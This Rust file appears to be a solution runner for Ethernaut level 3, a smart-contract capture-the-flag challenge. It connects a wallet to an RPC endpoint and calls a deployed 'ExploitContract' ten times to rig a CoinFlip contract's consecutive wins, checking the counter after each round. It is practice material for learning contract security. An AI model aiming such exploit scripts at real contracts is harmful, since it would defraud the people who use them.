#[allow(unused_imports)]
use alloy::{
    network::TransactionBuilder,
    primitives::{
        address,
        utils::{format_ether, Unit},
        U256,
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    contract ExploitContract {
        function exploit(address coinflip) public;
    }
    
    #[sol(rpc)]
    contract CoinFlip {
        function consecutiveWins() public view returns (uint256);
    }
}

use crate::ethernaut;

use tokio::runtime::Runtime;


#[allow(dead_code)]
pub fn level03_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level03())?;
    
    Ok(())
}

#[allow(dead_code)]
async fn level03() -> Result<(), Box<dyn std::error::Error>> {
    let signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    
    let provider = ProviderBuilder::new()
        .wallet(signer)
        .connect(ethernaut::RPC)
        .await?;
    
    let coinflip_address = "0x39edbceB9835796F012C04c668A67A4Ab15e0f6d";
    let coinflip = CoinFlip::new(coinflip_address.parse()?, provider.clone());
    let exploit_address = "0xf4387fa53b812257747de073eac1ba8431d47d47";
    let exploit = ExploitContract::new(exploit_address.parse()?, provider.clone());
    
    println!("[CHECK]");
    let consecutive_wins = coinflip.consecutiveWins().call().await?;
    println!("coinflip's consecutiveWins = {consecutive_wins}\n");
    
    for round in 0..10 {
        let exploit_tx = exploit
            .exploit(coinflip_address.parse()?)
            .send()
            .await?;
        println!("<exploit.exploit>    Panding transaction... {}", exploit_tx.tx_hash());
        
        let exploit_receipt = exploit_tx
            .get_receipt()
            .await?;
        println!(
            "<exploit.exploit>    exploit included in block {}\n",
            exploit_receipt.block_number.expect("Failed to get block number")
        );
        
        // Check
        println!("[CHECK-{round}]");
        let consecutive_wins = coinflip.consecutiveWins().call().await?;
        println!("coinflip's consecutiveWins = {consecutive_wins}\n");
    }

    Ok(())
}